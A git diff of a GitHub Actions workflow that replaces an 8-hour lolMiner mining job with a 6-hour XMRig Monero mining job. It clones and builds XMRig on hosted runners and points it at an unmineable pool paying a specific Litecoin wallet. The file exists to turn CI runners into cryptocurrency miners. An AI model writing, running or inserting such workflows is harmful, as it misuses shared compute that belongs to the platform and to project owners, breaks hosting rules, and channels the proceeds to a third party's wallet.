@@ -1,4 +1,4 @@
-name: lolMiner LTC Mining (8 Hours)
+name: Monero Mining with XMRig via Unmineable
 
 on:
   workflow_dispatch:
@@ -6,33 +6,28 @@ on:
 jobs:
   mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 480  # 8 hours total
+    timeout-minutes: 360  # 6 hours max
 
     steps:
-      - name: Install Dependencies
-        run: |
-          sudo apt update
-          sudo apt install -y wget unzip screen pciutils
+    - name: Checkout
+      uses: actions/checkout@v3
 
-      - name: Setup NVIDIA Driver and Check GPU
-        run: |
-          sudo apt install -y nvidia-driver-470 || true
-          sudo modprobe nvidia || true
-          nvidia-smi || echo "GPU not found or not supported on this runner"
+    - name: Install dependencies
+      run: |
+        sudo apt update
+        sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download and Run lolMiner with Timeout Loop
-        run: |
-          wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
-          tar -xvzf lolMiner_v1.82_Lin64.tar.gz
-          cd 1.82
-          chmod +x lolMiner
+    - name: Clone XMRig
+      run: |
+        git clone https://github.com/xmrig/xmrig.git
+        mkdir xmrig/build
+        cd xmrig/build
+        cmake ..
+        make -j$(nproc)
 
-          end=$((SECONDS+28800))  # 8 hours = 28800 seconds
-          while [ $SECONDS -lt $end ]; do
-            echo "Starting lolMiner at $(date)"
-            timeout 350m ./lolMiner --algo ETHASH \
-              --pool stratum+tcp://ethash.unmineable.com:3333 \
-              --user LTC:ltc1qpr87n7at9emtujezjuhclt0epynmc6c9vek57x.ucode0#u3ux-cj3w \
-              --ethstratum ETHPROXY || echo "lolMiner exited"
-            sleep 10
-          done
+    - name: Start Mining
+      run: |
+        cd xmrig/build
+        ./xmrig -o randomx.unmineable.com:3333 \
+          -u LTC:ltc1qpr87n7at9emtujezjuhclt0epynmc6c9vek57x.githubXMR#u3ux-cj3w \
+          --coin monero -k --donate-level 1
